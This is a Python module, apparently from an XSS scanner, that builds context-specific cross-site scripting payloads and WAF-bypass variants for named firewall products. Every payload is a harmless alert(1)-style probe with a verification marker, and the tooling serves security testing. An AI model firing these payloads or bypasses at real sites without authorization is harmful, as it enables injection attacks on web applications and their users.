"""
Dynamic payload generation engine.

Generates context-aware XSS payloads based on probe results (reflection
context, available characters, quote types) instead of using static lists.

This replaces the old static generator and consolidates the payload
generation logic that was previously scattered in xss_engine.py.

Usage::

    gen = PayloadGenerator()
    payloads = gen.generate(
        context='html',
        chars={'<': 'raw', '>': 'raw', '"': 'encoded', ...},
        quote_type=None,
        in_script=False,
        in_attribute=False,
        attr_name=None,
        marker='class=akha',
        waf_name=None,
    )
"""

from __future__ import annotations

import re
from typing import Dict, List, Optional


DEFAULT_MARKER = 'class=akha'

WAF_BYPASS_PROFILES = {
    "cloudflare": [
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ],
    "modsecurity": [
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<<script>alert(1)//<</script>",
    ],
    "akamai": [
        "%3cscript%3ealert(1)%3c/script%3e",
        "<svg onload\x09=alert(1)>",
    ],
    "imperva": [
        "<isindex action=javascript:alert(1) type=image>",
        "<object data='javascript:alert(1)'>",
    ],
    "generic": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'><img src=x onerror=alert(1)>",
    ],
}


class PayloadGenerator:
    """
    Generates XSS payloads dynamically based on injection context and
    character availability detected during the probe phase.
    """

    def generate(
        self,
        context: str,
        chars: Dict[str, str],
        quote_type: Optional[str] = None,
        in_script: bool = False,
        in_attribute: bool = False,
        attr_name: Optional[str] = None,
        marker: str = DEFAULT_MARKER,
        waf_name: Optional[str] = None,
        minimal_grammar: bool = True,
    ) -> List[str]:
        """
        Generate payloads for the detected injection context.

        Args:
            context: 'html' | 'attribute' | 'javascript' | 'url' | 'css' | 'comment'
            chars: Dict mapping special chars to 'raw' | 'encoded' | 'removed'
            quote_type: Quote character used around the reflection ('"', "'", '`', None)
            in_script: True if inside a <script> block
            in_attribute: True if inside an HTML attribute
            attr_name: Name of the attribute (if in_attribute)
            marker: Verification marker to embed in payloads
            waf_name: Detected WAF name (for bypass variants)

        Returns:
            List of payloads ordered by likelihood of success.
        """
        lt = chars.get('<', 'removed') == 'raw'
        gt = chars.get('>', 'removed') == 'raw'
        dq = chars.get('"', 'removed') == 'raw'
        sq = chars.get("'", 'removed') == 'raw'
        paren = (chars.get('(', 'removed') == 'raw'
                 and chars.get(')', 'removed') == 'raw')
        bt = chars.get('`', 'removed') == 'raw'
        slash = chars.get('/', 'removed') == 'raw'

        payloads: List[str] = []

        if minimal_grammar:
            payloads.extend(
                self._gen_minimal_candidates(
                    context=context,
                    lt=lt,
                    gt=gt,
                    dq=dq,
                    sq=sq,
                    paren=paren,
                    bt=bt,
                    quote_type=quote_type,
                    marker=marker,
                )
            )

        if context == 'html':
            payloads = self._gen_html(lt, gt, dq, sq, paren, bt, slash, marker)
        elif context == 'attribute':
            payloads = self._gen_attribute(
                lt, gt, dq, sq, paren, bt, slash, quote_type, attr_name, marker)
        elif context == 'javascript':
            payloads = self._gen_javascript(
                lt, gt, dq, sq, paren, bt, slash, quote_type,
                in_script, in_attribute, attr_name, marker)
        elif context == 'url':
            payloads = self._gen_url(lt, gt, dq, sq, paren, bt, slash,
                                     quote_type, marker)
        elif context == 'css':
            payloads = self._gen_css(lt, gt, paren, slash, marker)
        elif context == 'comment':
            payloads = self._gen_comment(lt, gt, paren, bt, marker)

        payloads.extend(self._gen_polyglots(lt, gt, dq, sq, paren, bt, slash, marker))

        if waf_name:
            payloads.extend(self.get_bypass_payloads(waf_name))

        payloads = self._dedupe([p for p in payloads if p])

        return payloads

    def _gen_minimal_candidates(
        self,
        *,
        context: str,
        lt: bool,
        gt: bool,
        dq: bool,
        sq: bool,
        paren: bool,
        bt: bool,
        quote_type: Optional[str],
        marker: str,
    ) -> List[str]:
        """Generate short, explainable grammar-first payloads for each context."""
        call = 'alert(1)' if paren else ('alert`1`' if bt else None)
        if not call:
            call = 'alert&lpar;1&rpar;'

        if context == 'html':
            if lt and gt:
                return [f'<svg/onload={call} {marker}>']
            return []

        if context == 'attribute':
            if quote_type == '"' and dq:
                return [f'" onfocus={call} autofocus {marker} x="']
            if quote_type == "'" and sq:
                return [f"' onfocus={call} autofocus {marker} x='"]
            if lt and gt:
                return [f'><svg/onload={call} {marker}>']
            return [f' onfocus={call} autofocus {marker} ']

        if context == 'javascript':
            if quote_type == '"' and dq:
                return ['";alert(1)//' if paren else '";alert`1`//']
            if quote_type == "'" and sq:
                return ["';alert(1)//" if paren else "';alert`1`//"]
            return ['alert(1)' if paren else 'alert`1`']

        if context == 'url':
            return ['javascript:alert(1)' if paren else 'javascript:alert`1`']

        if context == 'css':
            if lt and gt:
                return [f'</style><svg/onload={call} {marker}>']
            return ['expression(alert(1))' if paren else 'expression(alert`1`)']

        if context == 'comment':
            if lt and gt:
                return [f'--><svg/onload={call} {marker}>']
            return []

        return []

    def get_bypass_payloads(self, waf_name: str) -> List[str]:
        name = (waf_name or '').lower()
        if 'cloudflare' in name:
            profile = WAF_BYPASS_PROFILES['cloudflare']
        elif 'modsecurity' in name:
            profile = WAF_BYPASS_PROFILES['modsecurity']
        elif 'akamai' in name:
            profile = WAF_BYPASS_PROFILES['akamai']
        elif 'imperva' in name or 'incapsula' in name:
            profile = WAF_BYPASS_PROFILES['imperva']
        else:
            profile = WAF_BYPASS_PROFILES.get(name, WAF_BYPASS_PROFILES["generic"])
        generic = WAF_BYPASS_PROFILES["generic"]
        return profile + [p for p in generic if p not in profile]

    def generate_breakout(
        self,
        context: str,
        chars: Dict[str, str],
        quote_type: Optional[str] = None,
        marker: str = DEFAULT_MARKER,
    ) -> List[str]:
        """
        Generate context-break payloads when standard payloads fail.
        Designed to escape the detected context more aggressively.
        """
        lt = chars.get('<', 'removed') == 'raw'
        gt = chars.get('>', 'removed') == 'raw'
        dq = chars.get('"', 'removed') == 'raw'
        sq = chars.get("'", 'removed') == 'raw'
        paren = (chars.get('(', 'removed') == 'raw'
                 and chars.get(')', 'removed') == 'raw')
        bt = chars.get('`', 'removed') == 'raw'
        slash = chars.get('/', 'removed') == 'raw'
        m = marker

        payloads: List[str] = []

        if context == 'javascript':
            payloads = self._breakout_js(dq, sq, bt, paren, lt, gt, slash, quote_type, m)
        elif context == 'attribute':
            payloads = self._breakout_attr(lt, gt, dq, sq, paren, bt, quote_type, m)
        elif context == 'html':
            payloads = self._breakout_html(lt, gt, dq, sq, paren, bt, m)
        elif context == 'url':
            payloads.extend([
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                f'"><svg/onload=alert(1) {m}>',
            ])
        elif context == 'comment':
            if lt and gt:
                payloads.extend([
                    f'--><svg/onload=alert(1) {m}>',
                    f'--><img src=x onerror=alert(1) {m}>',
                ])

        return self._dedupe([p for p in payloads if p])[:8]


    def _gen_html(self, lt, gt, dq, sq, paren, bt, slash, m) -> List[str]:
        payloads = []
        if lt and gt:
            if paren:
                payloads.extend([
                    f'<script {m}>alert(1)</script>' if slash else None,
                    f'<svg/onload=alert(1) {m}>',
                    f'<img src=x onerror=alert(1) {m}>',
                    f'<input onfocus=alert(1) autofocus {m}>',
                    f'<details open ontoggle=alert(1) {m}>',
                    f'<body onload=alert(1) {m}>',
                    f'<marquee onstart=alert(1) {m}>',
                ])
            if bt:
                payloads.extend([
                    f'<svg/onload=alert`1` {m}>',
                    f'<img src=x onerror=alert`1` {m}>',
                ])
            if not paren and not bt:
                payloads.extend([
                    f'<svg/onload=alert&lpar;1&rpar; {m}>',
                    f'<img src=x onerror=alert&#40;1&#41; {m}>',
                ])
        return payloads


    def _gen_attribute(self, lt, gt, dq, sq, paren, bt, slash, quote, attr, m):
        payloads = []
        call = 'alert(1)' if paren else ('alert`1`' if bt else None)
        entity_call = 'alert&lpar;1&rpar;' if not paren and not bt else None

        if quote == '"' and dq:
            if lt and gt and call:
                payloads.extend([
                    f'"><svg/onload={call} {m}>',
                    f'"><img src=x onerror={call} {m}>',
                ])
                if slash and paren:
                    payloads.append(f'"><script {m}>alert(1)</script>')
            if call:
                payloads.extend([
                    f'" autofocus onfocus={call} {m} x="',
                    f'" onmouseover={call} {m} x="',
                    f'" onclick={call} {m} x="',
                ])
            elif entity_call:
                payloads.append(f'" autofocus onfocus={entity_call} {m} x="')

        elif quote == "'" and sq:
            if lt and gt and call:
                payloads.extend([
                    f"'><svg/onload={call} {m}>",
                    f"'><img src=x onerror={call} {m}>",
                ])
            if call:
                payloads.extend([
                    f"' autofocus onfocus={call} {m} x='",
                    f"' onmouseover={call} {m} x='",
                ])

        elif quote is None:
            if lt and gt and call:
                payloads.extend([
                    f'><svg/onload={call} {m}>',
                    f'><img src=x onerror={call} {m}>',
                ])
            if call:
                payloads.extend([
                    f' autofocus onfocus={call} {m} ',
                    f' onmouseover={call} {m} ',
                ])

        if quote is None or (quote == '"' and not dq) or (quote == "'" and not sq):
            if lt and gt and call:
                payloads.append(f'><svg/onload={call} {m}><')

        return payloads


    def _gen_javascript(self, lt, gt, dq, sq, paren, bt, slash, quote,
                        in_script, in_attr, attr_name, m):
        payloads = []

        if in_script:
            if quote == '"' and dq:
                if paren:
                    payloads.extend([
                        '";alert(1)//',
                        '"+alert(1)//',
                        '"};alert(1)//',
                        '\\";alert(1)//',
                        '"-alert(1)-"',
                    ])
                if lt and gt and slash:
                    payloads.extend([
                        f'";</script><svg/onload=alert(1) {m}>',
                        f'"</script><script {m}>alert(1)</script>',
                    ])

            elif quote == "'" and sq:
                if paren:
                    payloads.extend([
                        "';alert(1)//",
                        "'+alert(1)//",
                        "'};alert(1)//",
                        "\\\';alert(1)//",
                        "'-alert(1)-'",
                    ])
                if lt and gt and slash:
                    payloads.extend([
                        f"';</script><svg/onload=alert(1) {m}>",
                        f"'</script><script {m}>alert(1)</script>",
                    ])

            elif quote == '`' and bt:
                payloads.extend([
                    '${alert(1)}',
                    '`;alert(1)//',
                ])

            else:
                if paren:
                    payloads.extend([
                        'alert(1)',
                        ';alert(1)//',
                        '};alert(1)//',
                        '-alert(1)-',
                    ])
                if lt and gt and slash:
                    payloads.extend([
                        f'</script><svg/onload=alert(1) {m}>',
                        f'</script><img src=x onerror=alert(1) {m}>',
                    ])

        elif in_attr and attr_name and attr_name.lower().startswith('on'):
            if paren:
                payloads.extend(['alert(1)', ';alert(1)'])

        return payloads


    def _gen_url(self, lt, gt, dq, sq, paren, bt, slash, quote, m):
        payloads = [
            'javascript:alert(1)',
            'JaVaScRiPt:alert(1)',
            'javascript:void(alert(1))',
            'data:text/html,<script>alert(1)</script>',
        ]
        if lt and gt:
            if quote == '"' and dq:
                payloads.extend([
                    f'"><svg/onload=alert(1) {m}>',
                    f'"><img src=x onerror=alert(1) {m}>',
                ])
            elif quote == "'" and sq:
                payloads.extend([
                    f"'><svg/onload=alert(1) {m}>",
                    f"'><img src=x onerror=alert(1) {m}>",
                ])
        return payloads


    def _gen_css(self, lt, gt, paren, slash, m):
        payloads = []
        if lt and gt:
            payloads.extend([
                f'</style><svg/onload=alert(1) {m}>',
                f'</style><img src=x onerror=alert(1) {m}>',
            ])
        return payloads


    def _gen_comment(self, lt, gt, paren, bt, m):
        payloads = []
        if lt and gt:
            call = 'alert(1)' if paren else ('alert`1`' if bt else None)
            if call:
                payloads.extend([
                    f'--><svg/onload={call} {m}>',
                    f'--><img src=x onerror={call} {m}>',
                ])
        return payloads


    def _gen_polyglots(self, lt, gt, dq, sq, paren, bt, slash, m):
        """Small set of polyglot payloads that work across multiple contexts."""
        payloads = []
        if lt and gt and paren and slash:
            payloads.extend([
                f'"><img src=x onerror=alert(1) {m}>//',
                f'</script><script {m}>alert(1)</script>',
            ])
        return payloads


    def _breakout_js(self, dq, sq, bt, paren, lt, gt, slash, quote, m):
        payloads = []
        if quote == "'":
            if paren:
                payloads.extend([
                    "';alert(1);//", "';confirm(1);//",
                    "'+alert(1)+'", "'-alert(1)-'", "\\\';alert(1);//",
                ])
            if lt and gt and slash:
                payloads.append(f"';</script><svg/onload=alert(1) {m}>")
        elif quote == '"':
            if paren:
                payloads.extend([
                    '";alert(1);//', '";confirm(1);//',
                    '"+alert(1)+"', '"-alert(1)-"', '\\";alert(1);//',
                ])
            if lt and gt and slash:
                payloads.append(f'";</script><svg/onload=alert(1) {m}>')
        elif quote == '`':
            payloads.extend(['${alert(1)}', '${confirm(1)}', '`;alert(1);//'])
        else:
            if paren:
                payloads.extend(["';alert(1);//", '";alert(1);//',
                                 ';alert(1);//', '},alert(1);//'])
            if lt and gt and slash:
                payloads.append(f'</script><svg/onload=alert(1) {m}>')
        return payloads

    def _breakout_attr(self, lt, gt, dq, sq, paren, bt, quote, m):
        payloads = []
        call = 'alert(1)' if paren else ('alert`1`' if bt else None)
        if not call:
            return payloads

        if quote == '"':
            payloads.extend([
                f'" onmouseover={call} {m} x="',
                f'" onfocus={call} autofocus {m} x="',
                f'" onpointerenter={call} {m} x="',
            ])
            if lt and gt:
                payloads.extend([
                    f'"><svg/onload={call} {m}>',
                    f'"><img src=x onerror={call} {m}>',
                    f'"><details open ontoggle={call} {m}>',
                ])
        elif quote == "'":
            payloads.extend([
                f"' onmouseover={call} {m} x='",
                f"' onfocus={call} autofocus {m} x='",
            ])
            if lt and gt:
                payloads.extend([
                    f"'><svg/onload={call} {m}>",
                    f"'><img src=x onerror={call} {m}>",
                ])
        else:
            payloads.extend([
                f' onmouseover={call} {m} ',
                f' onfocus={call} autofocus {m} ',
            ])
            if lt and gt:
                payloads.append(f'><svg/onload={call} {m}>')
        return payloads

    def _breakout_html(self, lt, gt, dq, sq, paren, bt, m):
        payloads = []
        call = 'alert(1)' if paren else ('alert`1`' if bt else None)
        if not call:
            return payloads
        if lt and gt:
            payloads.extend([
                f'<svg/onload={call} {m}>',
                f'<img src=x onerror={call} {m}>',
                f'<details open ontoggle={call} {m}>',
                f'<input onfocus={call} autofocus {m}>',
            ])
        if dq and lt and gt:
            payloads.append(f'"><svg/onload={call} {m}>')
        if sq and lt and gt:
            payloads.append(f"'><img src=x onerror={call} {m}>")
        return payloads


    @staticmethod
    def _dedupe(payloads: List[str]) -> List[str]:
        seen: set = set()
        result: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                result.append(p)
        return result


    def generate_for_context(self, context: str, bypass_waf: Optional[str] = None) -> List[str]:
        """
        Legacy API — generate payloads for a context name string.
        Used by PayloadManager for 'auto' and 'builtin' strategies.
        """
        ctx_map = {
            'HTML': 'html', 'Attribute': 'attribute', 'JavaScript': 'javascript',
            'URL': 'url', 'CSS': 'css',
        }
        ctx = ctx_map.get(context, context.lower())
        all_raw = {c: 'raw' for c in '<>"\'`()/'}
        return self.generate(context=ctx, chars=all_raw, waf_name=bypass_waf)
